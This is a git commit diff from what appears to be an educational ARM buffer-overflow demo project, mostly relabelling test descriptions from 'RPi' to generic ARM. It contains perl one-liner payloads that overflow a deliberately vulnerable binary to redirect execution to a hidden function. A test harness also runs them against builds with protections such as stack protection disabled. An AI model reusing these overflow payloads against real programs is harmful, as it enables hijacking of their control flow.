0fb24edc7b41a16331d8b261ac4e9fc100bef713
Demo User <debian@beaglebone.localdomain>
2020-02-12 06:08:07 +0000

    Change text from RPi to generic ARM

--- code/arm_bof_poc/secretfunc_try2.sh
+++ code/arm_bof_poc/secretfunc_try2.sh
@@ -3,5 +3,7 @@
 # Find &secret_func
 # $ nm ./arm_bof_vuln |grep secret
 # 000104c4 t secret_func
+## 0000067c t secret_func
 
 perl -e 'print "A"x12 . "B"x4 . "\xc4\x04\x01\x00"' | ./arm_bof_vuln_reg
+#perl -e 'print "A"x12 . "B"x4 . "\x7c\x06\x00\x00"' | ./arm_bof_vuln_reg
--- code/arm_bof_poc/simple_bof_try1.sh
+++ code/arm_bof_poc/simple_bof_try1.sh
@@ -1,4 +1,5 @@
 #!/bin/bash
+# simple_bof_try1.sh
 name=$(basename "$0")
 CHKSEC=../tools_sec/checksec.sh/checksec
 SKIP_CHKSEC=0
@@ -48,23 +49,23 @@ perl -e 'print "A"x12 . "B"x4 . "C"x4' | ./${PUT}
 
 ## 'main'
 [ ! -f ${CHKSEC} ] && {
-  echo "${name}: shell script \"${CHKSEC}\" missing.."
+echo "${name}: Warning! shell script \"${CHKSEC}\" missing..(will skip)"
   SKIP_CHKSEC=1
 }
 
 PUT=./arm_bof_vuln_reg
-test_arm_bof ${PUT} "Test #1 : ${PUT} : built with RPi default gcc flags"
+test_arm_bof ${PUT} "Test #1 : ${PUT} : built with ARM system's default gcc flags"
 
 PUT=./arm_bof_vuln_reg_stripped
-test_arm_bof ${PUT} "Test #2 : ${PUT} : built with RPi default gcc flags and stripped"
+test_arm_bof ${PUT} "Test #2 : ${PUT} : built with ARM system's default gcc flags and stripped"
 
 PUT=./arm_bof_vuln_fortified
-test_arm_bof ${PUT} "Test #3 : ${PUT} : built with RPi gcc with fortification ON"
+test_arm_bof ${PUT} "Test #3 : ${PUT} : built with ARM system's gcc with fortification ON"
 
 PUT=./arm_bof_vuln_stackprot
-test_arm_bof ${PUT} "Test #4 : ${PUT} : built with RPi gcc with stack prot ON"
+test_arm_bof ${PUT} "Test #4 : ${PUT} : built with ARM system's gcc with stack prot ON"
 
 PUT=./arm_bof_vuln_lessprot
-test_arm_bof ${PUT} "Test #5 : ${PUT} : built with RPi gcc with -z execstack,-fno-stack-protector gcc flags"
+test_arm_bof ${PUT} "Test #5 : ${PUT} : built with ARM system's gcc with -z execstack,-fno-stack-protector flags"
 
 exit 0
